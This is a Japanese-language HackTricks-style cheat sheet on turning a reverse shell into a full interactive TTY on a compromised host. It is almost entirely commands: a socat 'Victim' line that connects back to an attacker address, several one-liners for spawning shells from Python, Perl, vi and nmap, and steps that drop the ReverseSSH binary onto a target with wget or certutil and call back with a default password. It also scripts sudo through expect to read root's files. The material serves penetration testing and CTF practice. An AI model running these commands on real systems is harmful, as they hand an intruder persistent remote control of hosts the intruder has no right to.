# フルTTYs

{{#include ../../banners/hacktricks-training.md}}

## フルTTY

`SHELL` 変数に設定するシェルは、必ず _**/etc/shells**_ に **リストされている必要があります** または `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。また、次のスニペットは bash でのみ動作することに注意してください。zsh にいる場合は、`bash` を実行してシェルを取得する前に bash に変更してください。

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> **`stty -a`**を実行することで、**行**と**列**の**数**を取得できます。

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **シェルを生成する**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**インタラクティブシェルアクセス**、**ファイル転送**、および**ポートフォワーディング**の便利な方法は、静的リンクされたsshサーバー[ReverseSSH](https://github.com/Fahrj/reverse-ssh)をターゲットにドロップすることです。

以下は、upx圧縮バイナリを使用した`x86`の例です。他のバイナリについては、[リリースページ](https://github.com/Fahrj/reverse-ssh/releases/latest/)を確認してください。

1. sshポートフォワーディングリクエストをキャッチするためにローカルで準備します:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linuxターゲット:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 ターゲット (以前のバージョンについては、[project readme](https://github.com/Fahrj/reverse-ssh#features)を確認してください):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- ReverseSSHポートフォワーディングリクエストが成功した場合、`reverse-ssh(.exe)`を実行しているユーザーのコンテキストで、デフォルトのパスワード`letmeinbrudipls`でログインできるはずです：
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) は、Linux リバースシェルを自動的に TTY にアップグレードし、ターミナルサイズを処理し、すべてをログに記録し、さらに多くの機能を提供します。また、Windows シェルのための readline サポートも提供します。

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

何らかの理由で完全な TTY を取得できない場合でも、**ユーザー入力を期待するプログラムと対話することができます**。次の例では、パスワードが `sudo` に渡されてファイルを読み取ります：
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
